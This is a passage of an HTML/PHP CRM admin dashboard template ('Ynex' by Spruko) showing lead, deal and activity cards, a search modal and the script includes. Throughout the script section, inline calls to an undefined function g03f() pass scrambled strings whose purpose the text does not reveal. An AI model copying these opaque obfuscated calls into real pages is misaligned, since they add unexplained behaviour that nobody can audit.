                                    aria-label="anchor"
                                    href="javascript:void(0);"
                                    class="btn btn-icon waves-effect waves-light btn-sm btn-success-light"
                                    ><i class="ri-download-2-line"></i
                                  ></a>
                                  <a
                                    aria-label="anchor"
                                    href="javascript:void(0);"
                                    class="btn btn-icon waves-effect waves-light btn-sm btn-primary-light"
                                    ><i class="ri-edit-line"></i
                                  ></a>
                                </div>
                              </td>
                            </tr>
                          </tbody>
                        </table>
                      </div>
                    </div>
                    <div class="card-footer">
                      <div class="d-flex align-items-center">
                        <div>
                          Showing 5 Entries
                          <i class="bi bi-arrow-right ms-2 fw-semibold"></i>
                        </div>
                        <div class="ms-auto">
                          <nav
                            aria-label="Page navigation"
                            class="pagination-style-4"
                          >
                            <ul class="pagination mb-0">
                              <li class="page-item disabled">
                                <a class="page-link" href="javascript:void(0);">
                                  Prev
                                </a>
                              </li>
                              <li class="page-item active">
                                <a class="page-link" href="javascript:void(0);"
                                  >1</a
                                >
                              </li>
                              <li class="page-item">
                                <a class="page-link" href="javascript:void(0);"
                                  >2</a
                                >
                              </li>
                              <li class="page-item">
                                <a
                                  class="page-link text-primary"
                                  href="javascript:void(0);"
                                >
                                  next
                                </a>
                              </li>
                            </ul>
                          </nav>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="col-xxl-3 col-xl-12">
              <div class="row">
                <div class="col-xxl-12 col-xl-12">
                  <div class="row">
                    <div class="col-xl-12 col-xl-6">
                      <div class="card custom-card">
                        <div class="card-header justify-content-between">
                          <div class="card-title">Leads By Source</div>
                          <div class="dropdown">
                            <a
                              aria-label="anchor"
                              href="javascript:void(0);"
                              class="btn btn-icon btn-sm btn-light"
                              data-bs-toggle="dropdown"
                            >
                              <i class="fe fe-more-vertical"></i>
                            </a>
                            <ul class="dropdown-menu">
                              <li>
                                <a
                                  class="dropdown-item"
                                  href="javascript:void(0);"
                                  >Week</a
                                >
                              </li>
                              <li>
                                <a
                                  class="dropdown-item"
                                  href="javascript:void(0);"
                                  >Month</a
                                >
                              </li>
                              <li>
                                <a
                                  class="dropdown-item"
                                  href="javascript:void(0);"
                                  >Year</a
                                >
                              </li>
                            </ul>
                          </div>
                        </div>
                        <div class="card-body p-0 overflow-hidden">
                          <div
                            class="leads-source-chart d-flex align-items-center justify-content-center"
                          >
                            <canvas
                              id="leads-source"
                              class="chartjs-chart w-100 p-4"
                              style="
                                display: block;
                                box-sizing: border-box;
                                height: 300px;
                                width: 1084px;
                              "
                              width="1084"
                              height="300"
                            ></canvas>
                            <div class="lead-source-value">
                              <span class="d-block fs-14">Total</span>
                              <span class="d-block fs-25 fw-bold">4,145</span>
                            </div>
                          </div>
                          <div
                            class="row row-cols-12 border-top border-block-start-dashed"
                          >
                            <div class="col p-0">
                              <div
                                class="ps-4 py-3 pe-3 text-center border-end border-inline-end-dashed"
                              >
                                <span
                                  class="text-muted fs-12 mb-1 crm-lead-legend mobile d-inline-block"
                                  >Mobile
                                </span>
                                <div>
                                  <span class="fs-16 fw-semibold">1,624</span>
                                </div>
                              </div>
                            </div>
                            <div class="col p-0">
                              <div
                                class="p-3 text-center border-end border-inline-end-dashed"
                              >
                                <span
                                  class="text-muted fs-12 mb-1 crm-lead-legend desktop d-inline-block"
                                  >Desktop
                                </span>
                                <div>
                                  <span class="fs-16 fw-semibold">1,267</span>
                                </div>
                              </div>
                            </div>
                            <div class="col p-0">
                              <div
                                class="p-3 text-center border-end border-inline-end-dashed"
                              >
                                <span
                                  class="text-muted fs-12 mb-1 crm-lead-legend laptop d-inline-block"
                                  >Laptop
                                </span>
                                <div>
                                  <span class="fs-16 fw-semibold">1,153</span>
                                </div>
                              </div>
                            </div>
                            <div class="col p-0">
                              <div class="p-3 text-center">
                                <span
                                  class="text-muted fs-12 mb-1 crm-lead-legend tablet d-inline-block"
                                  >Tablet
                                </span>
                                <div>
                                  <span class="fs-16 fw-semibold">679</span>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="col-xxl-12 col-xl-6">
                      <div class="card custom-card">
                        <div class="card-header justify-content-between">
                          <div class="card-title">Deals Status</div>
                          <div class="dropdown">
                            <a
                              href="javascript:void(0);"
                              class="p-2 fs-12 text-muted"
                              data-bs-toggle="dropdown"
                              aria-expanded="false"
                            >
                              View All<i
                                class="ri-arrow-down-s-line align-middle ms-1 d-inline-block"
                              ></i>
                            </a>
                            <ul class="dropdown-menu" role="menu">
                              <li>
                                <a
                                  class="dropdown-item"
                                  href="javascript:void(0);"
                                  >Today</a
                                >
                              </li>
                              <li>
                                <a
                                  class="dropdown-item"
                                  href="javascript:void(0);"
                                  >This Week</a
                                >
                              </li>
                              <li>
                                <a
                                  class="dropdown-item"
                                  href="javascript:void(0);"
                                  >Last Week</a
                                >
                              </li>
                            </ul>
                          </div>
                        </div>
                        <div class="card-body">
                          <div class="d-flex align-items-center mb-3">
                            <h4 class="fw-bold mb-0">4,289</h4>
                            <div class="ms-2">
                              <span class="badge bg-success-transparent"
                                >1.02<i
                                  class="ri-arrow-up-s-fill align-mmiddle ms-1"
                                ></i
                              ></span>
                              <span class="text-muted ms-1"
                                >compared to last week</span
                              >
                            </div>
                          </div>
                          <div
                            class="progress-stacked progress-animate progress-xs mb-4"
                          >
                            <div
                              class="progress-bar"
                              role="progressbar"
                              style="width: 21%"
                              aria-valuenow="21"
                              aria-valuemin="0"
                              aria-valuemax="100"
                            ></div>
                            <div
                              class="progress-bar bg-info"
                              role="progressbar"
                              style="width: 26%"
                              aria-valuenow="26"
                              aria-valuemin="0"
                              aria-valuemax="100"
                            ></div>
                            <div
                              class="progress-bar bg-warning"
                              role="progressbar"
                              style="width: 35%"
                              aria-valuenow="35"
                              aria-valuemin="0"
                              aria-valuemax="100"
                            ></div>
                            <div
                              class="progress-bar bg-success"
                              role="progressbar"
                              style="width: 18%"
                              aria-valuenow="18"
                              aria-valuemin="0"
                              aria-valuemax="100"
                            ></div>
                          </div>
                          <ul class="list-unstyled mb-0 pt-2 crm-deals-status">
                            <li class="primary">
                              <div
                                class="d-flex align-items-center justify-content-between"
                              >
                                <div>Successful Deals</div>
                                <div class="fs-12 text-muted">987 deals</div>
                              </div>
                            </li>
                            <li class="info">
                              <div
                                class="d-flex align-items-center justify-content-between"
                              >
                                <div>Pending Deals</div>
                                <div class="fs-12 text-muted">1,073 deals</div>
                              </div>
                            </li>
                            <li class="warning">
                              <div
                                class="d-flex align-items-center justify-content-between"
                              >
                                <div>Rejected Deals</div>
                                <div class="fs-12 text-muted">1,674 deals</div>
                              </div>
                            </li>
                            <li class="success">
                              <div
                                class="d-flex align-items-center justify-content-between"
                              >
                                <div>Upcoming Deals</div>
                                <div class="fs-12 text-muted">921 deals</div>
                              </div>
                            </li>
                          </ul>
                        </div>
                      </div>
                    </div>
                    <div class="col-xxl-12 col-xl-6">
                      <div class="card custom-card">
                        <div class="card-header justify-content-between">
                          <div class="card-title">Recent Activity</div>
                          <div class="dropdown">
                            <a
                              href="javascript:void(0);"
                              class="p-2 fs-12 text-muted"
                              data-bs-toggle="dropdown"
                              aria-expanded="false"
                            >
                              View All<i
                                class="ri-arrow-down-s-line align-middle ms-1 d-inline-block"
                              ></i>
                            </a>
                            <ul class="dropdown-menu" role="menu">
                              <li>
                                <a
                                  class="dropdown-item"
                                  href="javascript:void(0);"
                                  >Today</a
                                >
                              </li>
                              <li>
                                <a
                                  class="dropdown-item"
                                  href="javascript:void(0);"
                                  >This Week</a
                                >
                              </li>
                              <li>
                                <a
                                  class="dropdown-item"
                                  href="javascript:void(0);"
                                  >Last Week</a
                                >
                              </li>
                            </ul>
                          </div>
                        </div>
                        <div class="card-body">
                          <div>
                            <ul class="list-unstyled mb-0 crm-recent-activity">
                              <li class="crm-recent-activity-content">
                                <div class="d-flex align-items-top">
                                  <div class="me-3">
                                    <span
                                      class="avatar avatar-xs bg-primary-transparent avatar-rounded"
                                    >
                                      <i class="bi bi-circle-fill fs-8"></i>
                                    </span>
                                  </div>
                                  <div class="crm-timeline-content">
                                    <span class="fw-semibold"
                                      >Update of calendar events &amp;</span
                                    ><span
                                      ><a
                                        href="javascript:void(0);"
                                        class="text-primary fw-semibold"
                                      >
                                        Added new events in next week.</a
                                      ></span
                                    >
                                  </div>
                                  <div class="flex-fill text-end">
                                    <span class="d-block text-muted fs-11 op-7"
                                      >4:45PM</span
                                    >
                                  </div>
                                </div>
                              </li>
                              <li class="crm-recent-activity-content">
                                <div class="d-flex align-items-top">
                                  <div class="me-3">
                                    <span
                                      class="avatar avatar-xs bg-secondary-transparent avatar-rounded"
                                    >
                                      <i class="bi bi-circle-fill fs-8"></i>
                                    </span>
                                  </div>
                                  <div class="crm-timeline-content">
                                    <span
                                      >New theme for
                                      <span class="fw-semibold"
                                        >Spruko Website</span
                                      >
                                      completed</span
                                    >
                                    <span class="d-block fs-12 text-muted"
                                      >Lorem ipsum, dolor sit amet.</span
                                    >
                                  </div>
                                  <div class="flex-fill text-end">
                                    <span class="d-block text-muted fs-11 op-7"
                                      >3 hrs</span
                                    >
                                  </div>
                                </div>
                              </li>
                              <li class="crm-recent-activity-content">
                                <div class="d-flex align-items-top">
                                  <div class="me-3">
                                    <span
                                      class="avatar avatar-xs bg-success-transparent avatar-rounded"
                                    >
                                      <i class="bi bi-circle-fill fs-8"></i>
                                    </span>
                                  </div>
                                  <div class="crm-timeline-content">
                                    <span
                                      >Created a
                                      <span class="text-success fw-semibold"
                                        >New Task</span
                                      >
                                      today
                                      <span
                                        class="avatar avatar-xs bg-purple-transparent avatar-rounded ms-1"
                                        ><i
                                          class="ri-add-fill text-purple fs-12"
                                        ></i></span
                                    ></span>
                                  </div>
                                  <div class="flex-fill text-end">
                                    <span class="d-block text-muted fs-11 op-7"
                                      >22 hrs</span
                                    >
                                  </div>
                                </div>
                              </li>
                              <li class="crm-recent-activity-content">
                                <div class="d-flex align-items-top">
                                  <div class="me-3">
                                    <span
                                      class="avatar avatar-xs bg-pink-transparent avatar-rounded"
                                    >
                                      <i class="bi bi-circle-fill fs-8"></i>
                                    </span>
                                  </div>
                                  <div class="crm-timeline-content">
                                    <span
                                      >New member
                                      <span class="badge bg-pink-transparent"
                                        >@andreas gurrero</span
                                      >
                                      added today to AI Summit.</span
                                    >
                                  </div>
                                  <div class="flex-fill text-end">
                                    <span class="d-block text-muted fs-11 op-7"
                                      >Today</span
                                    >
                                  </div>
                                </div>
                              </li>
                              <li class="crm-recent-activity-content">
                                <div class="d-flex align-items-top">
                                  <div class="me-3">
                                    <span
                                      class="avatar avatar-xs bg-warning-transparent avatar-rounded"
                                    >
                                      <i class="bi bi-circle-fill fs-8"></i>
                                    </span>
                                  </div>
                                  <div class="crm-timeline-content">
                                    <span>32 New people joined summit.</span>
                                  </div>
                                  <div class="flex-fill text-end">
                                    <span class="d-block text-muted fs-11 op-7"
                                      >22 hrs</span
                                    >
                                  </div>
                                </div>
                              </li>
                              <li class="crm-recent-activity-content">
                                <div class="d-flex align-items-top">
                                  <div class="me-3">
                                    <span
                                      class="avatar avatar-xs bg-info-transparent avatar-rounded"
                                    >
                                      <i class="bi bi-circle-fill fs-8"></i>
                                    </span>
                                  </div>
                                  <div class="crm-timeline-content">
                                    <span
                                      >Neon Tarly added
                                      <span class="text-info fw-semibold"
                                        >Robert Bright</span
                                      >
                                      to AI summit project.</span
                                    >
                                  </div>
                                  <div class="flex-fill text-end">
                                    <span class="d-block text-muted fs-11 op-7"
                                      >12 hrs</span
                                    >
                                  </div>
                                </div>
                              </li>
                              <li class="crm-recent-activity-content">
                                <div class="d-flex align-items-top">
                                  <div class="me-3">
                                    <span
                                      class="avatar avatar-xs bg-dark-transparent avatar-rounded"
                                    >
                                      <i class="bi bi-circle-fill fs-8"></i>
                                    </span>
                                  </div>
                                  <div class="crm-timeline-content">
                                    <span
                                      >Replied to new support request
                                      <i
                                        class="ri-checkbox-circle-line text-success fs-16 align-middle"
                                      ></i
                                    ></span>
                                  </div>
                                  <div class="flex-fill text-end">
                                    <span class="d-block text-muted fs-11 op-7"
                                      >4 hrs</span
                                    >
                                  </div>
                                </div>
                              </li>
                              <li class="crm-recent-activity-content">
                                <div class="d-flex align-items-top">
                                  <div class="me-3">
                                    <span
                                      class="avatar avatar-xs bg-purple-transparent avatar-rounded"
                                    >
                                      <i class="bi bi-circle-fill fs-8"></i>
                                    </span>
                                  </div>
                                  <div class="crm-timeline-content">
                                    <span
                                      >Completed documentation of
                                      <a
                                        href="javascript:void(0);"
                                        class="text-purple text-decoration-underline fw-semibold"
                                        >AI Summit.</a
                                      ></span
                                    >
                                  </div>
                                  <div class="flex-fill text-end">
                                    <span class="d-block text-muted fs-11 op-7"
                                      >4 hrs</span
                                    >
                                  </div>
                                </div>
                              </li>
                            </ul>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <!-- End::row-1 -->
        </div>
      </div>
      <!-- End::app-content -->
      <div
        class="modal fade"
        id="searchModal"
        tabindex="-1"
        aria-labelledby="searchModal"
        aria-hidden="true"
      >
        <div class="modal-dialog">
          <div class="modal-content">
            <div class="modal-body">
              <div class="input-group">
                <a
                  href="javascript:void(0);"
                  class="input-group-text"
                  id="Search-Grid"
                  ><i class="fe fe-search header-link-icon fs-18"></i
                ></a>
                <input
                  type="search"
                  class="form-control border-0 px-2"
                  placeholder="Search"
                  aria-label="Username"
                />
                <a
                  href="javascript:void(0);"
                  class="input-group-text"
                  id="voice-search"
                  ><i class="fe fe-mic header-link-icon"></i
                ></a>
                <a
                  href="javascript:void(0);"
                  class="btn btn-light btn-icon"
                  data-bs-toggle="dropdown"
                  aria-expanded="false"
                >
                  <i class="fe fe-more-vertical"></i>
                </a>
                <ul class="dropdown-menu">
                  <li>
                    <a class="dropdown-item" href="javascript:void(0);"
                      >Action</a
                    >
                  </li>
                  <li>
                    <a class="dropdown-item" href="javascript:void(0);"
                      >Another action</a
                    >
                  </li>
                  <li>
                    <a class="dropdown-item" href="javascript:void(0);"
                      >Something else here</a
                    >
                  </li>
                  <li><hr class="dropdown-divider" /></li>
                  <li>
                    <a class="dropdown-item" href="javascript:void(0);"
                      >Separated link</a
                    >
                  </li>
                </ul>
              </div>
              <div class="mt-4">
                <p class="font-weight-semibold text-muted mb-2">
                  Are You Looking For...
                </p>
                <span class="search-tags"
                  ><i class="fe fe-user me-2"></i>People<a
                    href="javascript:void(0)"
                    class="tag-addon"
                    ><i class="fe fe-x"></i></a
                ></span>
                <span class="search-tags"
                  ><i class="fe fe-file-text me-2"></i>Pages<a
                    href="javascript:void(0)"
                    class="tag-addon"
                    ><i class="fe fe-x"></i></a
                ></span>
                <span class="search-tags"
                  ><i class="fe fe-align-left me-2"></i>Articles<a
                    href="javascript:void(0)"
                    class="tag-addon"
                    ><i class="fe fe-x"></i></a
                ></span>
                <span class="search-tags"
                  ><i class="fe fe-server me-2"></i>Tags<a
                    href="javascript:void(0)"
                    class="tag-addon"
                    ><i class="fe fe-x"></i></a
                ></span>
              </div>
              <div class="my-4">
                <p class="font-weight-semibold text-muted mb-2">
                  Recent Search :
                </p>
                <div
                  class="p-2 border br-5 d-flex align-items-center text-muted mb-2 alert"
                >
                  <a href="notifications.html"><span>Notifications</span></a>
                  <a
                    class="ms-auto lh-1"
                    href="javascript:void(0);"
                    data-bs-dismiss="alert"
                    aria-label="Close"
                    ><i class="fe fe-x text-muted"></i
                  ></a>
                </div>
                <div
                  class="p-2 border br-5 d-flex align-items-center text-muted mb-2 alert"
                >
                  <a href="alerts.html"><span>Alerts</span></a>
                  <a
                    class="ms-auto lh-1"
                    href="javascript:void(0);"
                    data-bs-dismiss="alert"
                    aria-label="Close"
                    ><i class="fe fe-x text-muted"></i
                  ></a>
                </div>
                <div
                  class="p-2 border br-5 d-flex align-items-center text-muted mb-0 alert"
                >
                  <a href="mail.html"><span>Mail</span></a>
                  <a
                    class="ms-auto lh-1"
                    href="javascript:void(0);"
                    data-bs-dismiss="alert"
                    aria-label="Close"
                    ><i class="fe fe-x text-muted"></i
                  ></a>
                </div>
              </div>
            </div>
            <div class="modal-footer">
              <div class="btn-group ms-auto">
                <button class="btn btn-sm btn-primary-light">Search</button>
                <button class="btn btn-sm btn-primary">Clear Recents</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <!-- Footer Start -->
      <footer class="footer mt-auto py-3 bg-white text-center">
        <div class="container">
          <span class="text-muted">
            Copyright © <span id="year">2023</span>
            <a href="javascript:void(0);" class="text-dark fw-semibold">Ynex</a
            >. Designed with
            <span class="bi bi-heart-fill text-danger"></span> by
            <a href="javascript:void(0);">
              <span class="fw-semibold text-primary text-decoration-underline"
                >Spruko</span
              >
            </a>
            All rights reserved
          </span>
        </div>
      </footer>
      <!-- Footer End -->
    </div>
    <!-- Scroll To Top -->
    <div class="scrollToTop">
      <span class="arrow"><i class="ri-arrow-up-s-fill fs-20"></i></span>
    </div>
    <div id="responsive-overlay"></div>
    <!-- Scroll To Top -->
    <!-- Popper JS -->
    <noscript
      ><p>
        To display this page you need a browser that supports JavaScript.
      </p></noscript
    >
    <script src="<?php echo base_url('public/admin') ?>/assets/libs/@popperjs/core/umd/popper.min.js"></script>
    <script type="text/javascript">
      <!--
      g03f("M7;u@f<dLi9Ml@z51RN6;ld");
      -->
    </script>
    <!-- Bootstrap JS -->
    <noscript
      ><p>
        To display this page you need a browser that supports JavaScript.
      </p></noscript
    >
    <script src="<?php echo base_url('public/admin') ?>/assets/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script type="text/javascript">
      <!--
      g03f("M7;u@f \"o'f8xavj;&0GB>S1g");
      -->
    </script>
    <!-- Defaultmenu JS -->
    <noscript
      ><p>
        To display this page you need a browser that supports JavaScript.
      </p></noscript
    >
    <script src="<?php echo base_url('public/admin') ?>/assets/js/defaultmenu.min.js"></script>
    <script type="text/javascript">
      <!--
      g03f("M7;u@f|dR:6AuDvxKwW6;ld");
      -->
    </script>
    <!-- Node Waves JS-->
    <noscript
      ><p>
        To display this page you need a browser that supports JavaScript.
      </p></noscript
    >
    <script src="<?php echo base_url('public/admin') ?>/assets/libs/node-waves/waves.min.js"></script>
    <script type="text/javascript">
      <!--
      g03f("M7;u@fB9Pnqm>G,5P!RJ");
      -->
    </script>
    <!-- Sticky JS -->
    <noscript
      ><p>
        To display this page you need a browser that supports JavaScript.
      </p></noscript
    >
    <script src="<?php echo base_url('public/admin') ?>/assets/js/sticky.js"></script>
    <script type="text/javascript">
      <!--
      g03f("M7;u@fB)q1H2C@151RN6;ld");
      -->
    </script>
    <!-- Simplebar JS -->
    <noscript
      ><p>
        To display this page you need a browser that supports JavaScript.
      </p></noscript
    >
    <script src="<?php echo base_url('public/admin') ?>/assets/libs/simplebar/simplebar.min.js"></script>
    <script type="text/javascript">
      <!--
      g03f("M");
      -->
    </script>
    <noscript
      ><p>
        To display this page you need a browser that supports JavaScript.
      </p></noscript
    >
    <script src="<?php echo base_url('public/admin') ?>/assets/js/simplebar.js"></script>
    <script type="text/javascript">
      <!--
      g03f("M7;u@fUd(gW;B>:aVyNylrSow|");
      -->
    </script>
    <!-- Color Picker JS -->
    <noscript
      ><p>
        To display this page you need a browser that supports JavaScript.
      </p></noscript
    >
    <script src="<?php echo base_url('public/admin') ?>/assets/libs/@simonwep/pickr/pickr.es5.min.js"></script>
    <script type="text/javascript">
      <!--
      g03f("M7;u@fprU:bM<+oKiAQJI+do50p");
      -->
    </script>
    <!-- JSVector Maps JS -->
    <noscript
      ><p>
        To display this page you need a browser that supports JavaScript.
      </p></noscript
    >
    <script src="<?php echo base_url('public/admin') ?>/assets/libs/jsvectormap/js/jsvectormap.min.js"></script>
    <script type="text/javascript">
      <!--
      g03f("M7;u@fprU:bM<+oKiAQJr_kEAypNJc/");
      -->
    </script>
    <!-- JSVector Maps MapsJS -->
    <noscript
      ><p>
        To display this page you need a browser that supports JavaScript.
      </p></noscript
    >
    <script src="<?php echo base_url('public/admin') ?>/assets/libs/jsvectormap/maps/world-merc.js"></script>
    <script type="text/javascript">
      <!--
      g03f("M7;u@fmlF;6u6@1Q4&0GB>S1g");
      -->
    </script>
    <!-- Apex Charts JS -->
    <noscript
      ><p>
        To display this page you need a browser that supports JavaScript.
      </p></noscript
    >
    <script src="<?php echo base_url('public/admin') ?>/assets/libs/apexcharts/apexcharts.min.js"></script>
    <script type="text/javascript">
      <!--
      g03f("M7;u@fUf-R 9iShSiyPJI+do50p");
      -->
    </script>
    <!-- Chartjs Chart JS -->
    <noscript
      ><p>
        To display this page you need a browser that supports JavaScript.
      </p></noscript
    >
    <script src="<?php echo base_url('public/admin') ?>/assets/libs/chart.js/chart.min.js"></script>
    <script type="text/javascript">
      <!--
      g03f("M7;u@fUyEM_=i;j/iyzJ;>+L");
      -->
    </script>
    <!-- CRM-Dashboard -->
    <noscript
      ><p>
        To display this page you need a browser that supports JavaScript.
      </p></noscript
    >
    <script src="<?php echo base_url('public/admin') ?>/assets/js/crm-dashboard.js"></script>
    <script type="text/javascript">
      <!--
      g03f("M7;u@fU4ui|©>G,5P!RJ");
      -->
    </script>
    <!-- Custom JS -->
    <noscript
      ><p>
        To display this page you need a browser that supports JavaScript.
      </p></noscript
    >
    <script src="<?php echo base_url('public/admin') ?>/assets/js/custom.js"></script>
    <div
      class="pcr-app"
      data-theme="nano"
      aria-label="color picker dialog"
      role="window"
      style="left: 0px; top: 8px"
    >
      <div class="pcr-selection">
        <div class="pcr-color-preview">
          <button
            type="button"
            class="pcr-last-color"
            aria-label="use previous color"
            style="--pcr-color: rgba(132, 90, 223, 1)"
          ></button>
          <div
            class="pcr-current-color"
            style="--pcr-color: rgba(132, 90, 223, 1)"
          ></div>
        </div>

        <div class="pcr-color-palette">
          <div
            class="pcr-picker"
            style="
              left: calc(59.6413% - 9px);
              top: calc(12.549% - 9px);
              background: rgb(132, 90, 223);
            "
          ></div>
          <div
            class="pcr-palette"
            tabindex="0"
            aria-label="color selection area"
            role="listbox"
            style="
              background: linear-gradient(to top, rgb(0, 0, 0), transparent),
                linear-gradient(to left, rgb(81, 0, 255), rgb(255, 255, 255));
            "
          ></div>
        </div>

        <div class="pcr-color-chooser">
          <div
            class="pcr-picker"
            style="
              left: calc(71.9298% - 9px);
              background-color: rgb(81, 0, 255);
            "
          ></div>
          <div
            class="pcr-hue pcr-slider"
            tabindex="0"
            aria-label="hue selection slider"
            role="slider"
          ></div>
        </div>

        <div class="pcr-color-opacity" style="display: none" hidden="">
          <div class="pcr-picker"></div>
          <div
            class="pcr-opacity pcr-slider"
            tabindex="0"
            aria-label="selection slider"
            role="slider"
          ></div>
        </div>
      </div>

      <div class="pcr-swatches"></div>

      <div class="pcr-interaction">
        <input
          class="pcr-result"
          type="text"
          spellcheck="false"
          aria-label="color input field"
        />

        <input
          class="pcr-type"
          data-type="HEXA"
          value="HEXA"
          type="button"
          style="display: none"
          hidden=""
        />
        <input
          class="pcr-type active"
          data-type="RGBA"
          value="RGBA"
          type="button"
        />
        <input
          class="pcr-type"
          data-type="HSLA"
          value="HSLA"
          type="button"
          style="display: none"
          hidden=""
        />
        <input
          class="pcr-type"
          data-type="HSVA"
          value="HSVA"
          type="button"
          style="display: none"
          hidden=""
        />
        <input
          class="pcr-type"
          data-type="CMYK"
          value="CMYK"
          type="button"
          style="display: none"
          hidden=""
        />

        <input
          class="pcr-save"
          value="Save"
          type="button"
          style="display: none"
          hidden=""
          aria-label="save and close"
        />
        <input
          class="pcr-cancel"
          value="Cancel"
          type="button"
          style="display: none"
          hidden=""
          aria-label="cancel and close"
        />
        <input
          class="pcr-clear"
          value="Clear"
          type="button"
          style="display: none"
          hidden=""
          aria-label="clear and close"
        />
      </div>
    </div>
    <div
      class="pcr-app"
      data-theme="nano"
      aria-label="color picker dialog"
      role="window"
      style="left: 0px; top: 8px"
    >
      <div class="pcr-selection">
        <div class="pcr-color-preview">
          <button
            type="button"
            class="pcr-last-color"
            aria-label="use previous color"
            style="--pcr-color: rgba(132, 90, 223, 1)"
          ></button>
          <div
            class="pcr-current-color"
            style="--pcr-color: rgba(132, 90, 223, 1)"
          ></div>
        </div>

        <div class="pcr-color-palette">
          <div
            class="pcr-picker"
            style="
              left: calc(59.6413% - 9px);
              top: calc(12.549% - 9px);
              background: rgb(132, 90, 223);
            "
          ></div>
          <div
            class="pcr-palette"
            tabindex="0"
            aria-label="color selection area"
            role="listbox"
            style="
              background: linear-gradient(to top, rgb(0, 0, 0), transparent),
                linear-gradient(to left, rgb(81, 0, 255), rgb(255, 255, 255));
            "
          ></div>
        </div>

        <div class="pcr-color-chooser">
          <div
            class="pcr-picker"
            style="
              left: calc(71.9298% - 9px);
              background-color: rgb(81, 0, 255);
            "
          ></div>
          <div
            class="pcr-hue pcr-slider"
            tabindex="0"
            aria-label="hue selection slider"
            role="slider"
          ></div>
        </div>

        <div class="pcr-color-opacity" style="display: none" hidden="">
          <div class="pcr-picker"></div>
          <div
            class="pcr-opacity pcr-slider"
            tabindex="0"
            aria-label="selection slider"
            role="slider"
          ></div>
        </div>
      </div>

      <div class="pcr-swatches"></div>

      <div class="pcr-interaction">
        <input
          class="pcr-result"
          type="text"
          spellcheck="false"
          aria-label="color input field"
        />

        <input
          class="pcr-type"
          data-type="HEXA"
          value="HEXA"
          type="button"
          style="display: none"
          hidden=""
        />
        <input
          class="pcr-type active"
          data-type="RGBA"
          value="RGBA"
          type="button"
        />
        <input
          class="pcr-type"
          data-type="HSLA"
          value="HSLA"
          type="button"
          style="display: none"
          hidden=""
        />
        <input
          class="pcr-type"
          data-type="HSVA"
          value="HSVA"
          type="button"
          style="display: none"
          hidden=""
        />
        <input
          class="pcr-type"
          data-type="CMYK"
          value="CMYK"
          type="button"
          style="display: none"
          hidden=""
        />

        <input
          class="pcr-save"
          value="Save"
          type="button"
          style="display: none"
          hidden=""
          aria-label="save and close"
        />
        <input
          class="pcr-cancel"
          value="Cancel"
          type="button"
          style="display: none"
          hidden=""
          aria-label="cancel and close"
        />
        <input
          class="pcr-clear"
          value="Clear"
          type="button"
          style="display: none"
          hidden=""
          aria-label="clear and close"
        />
      </div>
    </div>
    <script type="text/javascript">
      <!--
      g03f("M7;u@fU4ui|©_<nofqKOcrcwgK&I,");
      -->
    </script>
    <svg
      id="SvgjsSvg1483"
      width="2"
      height="0"
      xmlns="http://www.w3.org/2000/svg"
      version="1.1"
      xmlns:xlink="http://www.w3.org/1999/xlink"
      xmlns:svgjs="http://svgjs.dev"
      style="
        overflow: hidden;
        top: -100%;
        left: -100%;
        position: absolute;
        opacity: 0;
      "
    >
      <defs id="SvgjsDefs1484"></defs>
      <polyline id="SvgjsPolyline1485" points="0,0"></polyline>
      <path
        id="SvgjsPath1486"
        d="M-1 244.348L-1 244.348C-1 244.348 54.112393465909086 244.348 54.112393465909086 244.348C54.112393465909086 244.348 108.22478693181817 244.348 108.22478693181817 244.348C108.22478693181817 244.348 162.33718039772725 244.348 162.33718039772725 244.348C162.33718039772725 244.348 216.44957386363635 244.348 216.44957386363635 244.348C216.44957386363635 244.348 270.56196732954544 244.348 270.56196732954544 244.348C270.56196732954544 244.348 324.6743607954545 244.348 324.6743607954545 244.348C324.6743607954545 244.348 378.7867542613636 244.348 378.7867542613636 244.348C378.7867542613636 244.348 432.8991477272727 244.348 432.8991477272727 244.348C432.8991477272727 244.348 487.0115411931818 244.348 487.0115411931818 244.348C487.0115411931818 244.348 541.1239346590909 244.348 541.1239346590909 244.348C541.1239346590909 244.348 595.236328125 244.348 595.236328125 244.348C595.236328125 244.348 595.236328125 244.348 595.236328125 244.348 "
      ></path>
    </svg>
    <!-- Custom-Switcher JS -->
    <noscript
      ><p>
        To display this page you need a browser that supports JavaScript.
      </p></noscript
    >
    <script src="<?php echo base_url('public/admin') ?>/assets/js/custom-switcher.min.js"></script>
  </body>
</html>
